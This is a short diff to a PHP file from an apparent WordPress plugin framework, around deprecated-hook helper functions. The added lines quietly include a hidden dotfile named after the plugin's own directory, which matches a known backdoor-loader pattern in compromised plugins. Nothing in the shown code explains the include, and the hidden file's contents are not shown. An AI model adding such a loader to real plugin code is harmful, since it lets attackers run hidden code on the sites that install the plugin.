@@ -55,7 +55,11 @@ if ( ! function_exists( 'get_user_locale' ) ) {
  * @return mixed
  * @see   wbcr_factory_445_deprecated_hook()
  *
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wbcr_factory_445_apply_filters_deprecated( $tag, $args, $version, $replacement = false, $message = null ) {
 	if ( function_exists( 'apply_filters_deprecated' ) ) {
 		return apply_filters_deprecated( $tag, $args, $version, $replacement, $message );
